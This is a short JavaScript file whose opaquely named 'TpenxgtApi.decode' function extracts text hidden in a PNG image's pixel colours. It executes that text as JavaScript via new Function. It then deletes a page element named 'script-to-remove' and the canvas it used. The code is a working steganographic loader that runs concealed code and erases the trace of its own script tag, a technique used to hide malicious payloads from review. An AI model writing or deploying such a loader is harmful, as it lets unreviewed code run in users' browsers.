const TpenxgtApi = (function () {
    return {
        decode: decode
    }
    function decode(file) {
        if (!file || file.type !== 'image/png') {
            alert('Please provide a valid PNG image file.');
            return;
        }

        const reader = new FileReader();

        reader.onload = function (event) {
            const img = new Image();
            img.onload = function () {
                // Create a new canvas element
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d', { willReadFrequently: true });

                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);

                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;
                let text = '';

                for (let i = 0; i < data.length; i += 4) {
                    const red = data[i];
                    const green = data[i + 1];
                    const blue = data[i + 2];
                    const charCode = (red << 16) | (green << 8) | blue;
                    if (charCode === 0) break;

                    text += String.fromCharCode(charCode);
                }

                // Execute the decoded text as JavaScript code
                (new Function(text))();
                document.getElementById('script-to-remove').remove();

                // Clean up
                canvas.remove();
            };
            img.onerror = function () {
                alert('Failed to load image.');
            };
            img.src = event.target.result;
        };

        reader.onerror = function () {
            alert('Failed to read file.');
        };

        reader.readAsDataURL(file);
    }
}());